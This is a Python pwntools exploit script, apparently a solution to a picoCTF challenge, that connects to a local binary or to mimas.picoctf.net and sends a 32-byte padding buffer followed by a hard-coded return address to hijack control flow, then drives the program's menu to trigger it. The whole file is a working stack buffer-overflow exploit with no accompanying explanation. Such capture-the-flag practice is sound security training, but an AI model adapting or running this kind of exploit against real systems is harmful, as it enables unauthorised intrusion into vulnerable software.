#!/usr/bin/env python3
from pwn import *

# Config
context.log_level = 'debug'
context.arch = 'amd64'

BINARY = './chall'  # replace as needed
HOST = 'mimas.picoctf.net'
PORT = 63071

def get_connection(mode):
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Use 'local' or 'remote'")
        exit(1)

def exploit(conn):
    # buffer of 32 bytes + target address in little endian
    payload = b"X" * 32
    payload += p64(0x4011a0)  # fix address as needed

    # adjust prompt as necessary
    conn.recv()
    conn.sendline(b"2")
    conn.recvuntil(b"Data for buffer: ")
    conn.sendline(payload)
    conn.recvuntil(b"Enter your choice: ")
    conn.sendline(b"4")
    conn.recv()

def main():
    import sys
    if len(sys.argv) != 2:
        log.error("Usage: python3 exploit.py [local|remote]")
        exit(1)

    conn = get_connection(sys.argv[1])
    exploit(conn)
    conn.close()

if __name__ == "__main__":
    main()
